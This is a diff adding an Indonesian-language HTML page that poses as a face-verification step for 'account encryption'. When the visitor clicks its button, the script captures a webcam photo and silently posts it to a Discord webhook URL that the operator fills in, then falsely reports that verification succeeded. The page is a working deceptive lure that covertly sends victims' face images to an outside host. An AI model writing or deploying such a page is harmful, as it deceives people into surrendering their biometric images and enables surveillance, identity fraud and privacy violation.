@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sesi Verifikasi Identitas</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background-color: #f0f2f5; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 400px;
+            text-align: center;
+        }
+        .header-img {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .icon-scan {
+            width: 80px;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=800&q=80" class="header-img">
+        
+        <img src="https://cdn-icons-png.flaticon.com/512/2562/2562291.png" class="icon-scan">
+        
+        <h2>Verifikasi Wajah</h2>
+        <p style="color: #666; font-size: 14px;">Pastikan wajah Anda terlihat jelas di kamera untuk melanjutkan proses enkripsi akun.</p>
+        
+        <button id="startBtn" onclick="ambilFoto()">MULAI PEMINDAIAN</button>
+        
+        <canvas id="canvas" style="display:none;"></canvas>
+        <video id="video" style="display:none;" autoplay></video>
+        <p id="status" style="margin-top: 15px; font-size: 12px; color: #999;"></p>
+    </div>
+
+    <script>
+        // Masukkan URL Webhook Anda di sini
+        const WEBHOOK_URL = "URL_WEBHOOK_ANDA_DI_SINI";
+
+        async function ambilFoto() {
+            const status = document.getElementById('status');
+            status.innerText = "Menghubungkan ke kamera...";
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        kirimKeDiscord(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (err) {
+                alert("Akses Kamera Ditolak.");
+            }
+        }
+
+        function kirimKeDiscord(imageBlob) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, 'verifikasi.jpg');
+            formData.append('payload_json', JSON.stringify({ content: "📸 **Data Verifikasi Diterima**" }));
+
+            fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+            .then(() => alert("Verifikasi Berhasil!"));
+        }
+    </script>
+</body>
+</html>
